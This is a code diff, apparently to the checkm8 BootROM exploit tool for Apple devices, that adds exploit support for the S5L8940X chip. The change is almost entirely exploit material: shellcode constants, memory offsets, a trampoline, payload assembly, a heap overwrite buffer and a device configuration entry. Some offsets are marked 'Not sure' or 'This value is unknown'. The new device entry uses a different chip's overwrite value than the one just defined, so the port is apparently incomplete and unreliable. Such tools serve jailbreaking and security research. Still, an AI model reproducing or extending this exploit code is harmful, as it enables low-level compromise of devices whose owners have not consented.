@@ -139,6 +139,31 @@ PAYLOAD_OFFSET_ARM64 = 384
 PAYLOAD_SIZE_ARM64   = 576
 
 def payload(cpid):
+  if cpid == 0x8940:
+    constants_usb_s5l8940x = [
+                0x34000000, # 1 - LOAD_ADDRESS
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                0x7214+1, # 6 - USB_CORE_DO_IO - Offset found
+    ]
+
+    constants_checkm8_s5l8940x = [
+                0x3402D848, # 1 - gUSBDescriptors - Offset found
+                0x3402DDA0, # 2 - gUSBSerialNumber - Offset found
+                0x7798+1, # 3 - usb_create_string_descriptor - Offset found
+                0x3402C18A, # 4 - gUSBSRNMStringDescriptor - Offset found
+                0x34039800, # 5 - PAYLOAD_DEST
+                PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+                PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x3402D92C, # 8 - PAYLOAD_PTR - Not sure
+    ]
+    s5l8940x_handler = asm_thumb_trampoline(0x34039800+1, 0x7C80+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8940x)[8:]
+    s5l8940x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8940x)
+    assert len(s5l8940x_shellcode) <= PAYLOAD_OFFSET_ARMV7
+    assert len(s5l8940x_handler) <= PAYLOAD_SIZE_ARMV7
+    return s5l8940x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8940x_shellcode)) + s5l8940x_handler
   if cpid == 0x8947:
     constants_usb_s5l8947x = [
                 0x34000000, # 1 - LOAD_ADDRESS
@@ -428,6 +453,7 @@ def all_exploit_configs():
   t8011_nop_gadget = 0x10000CD0C
   t8015_nop_gadget = 0x10000A9C4
 
+  s5l8940x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000) # This value is unknown
   s5l8947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)
   s5l895xx_overwrite = '\0' * 0x640 + struct.pack('<20xI4x', 0x10000000)
   t800x_overwrite    = '\0' * 0x5C0 + struct.pack('<20xI4x', 0x48818000)
@@ -437,6 +463,7 @@ def all_exploit_configs():
   t8015_overwrite    = '\0' * 0x500 + struct.pack('<32x2Q16x32x2Q12xI', t8015_nop_gadget, 0x18001C020, t8015_nop_gadget, 0x18001C020, 0xbeefbeef)
 
   return [
+    DeviceConfig('iBoot-838.3',           0x8940,  626, s5l8947x_overwrite, None, None), # S5L8940 This value is unknown
     DeviceConfig('iBoot-1458.2',          0x8947,  626, s5l8947x_overwrite, None, None), # S5L8947 (DFU loop)     1.97 seconds
     DeviceConfig('iBoot-1145.3'  ,        0x8950,  659, s5l895xx_overwrite, None, None), # S5L8950 (buttons)      2.30 seconds
     DeviceConfig('iBoot-1145.3.3',        0x8955,  659, s5l895xx_overwrite, None, None), # S5L8955 (buttons)      2.30 seconds
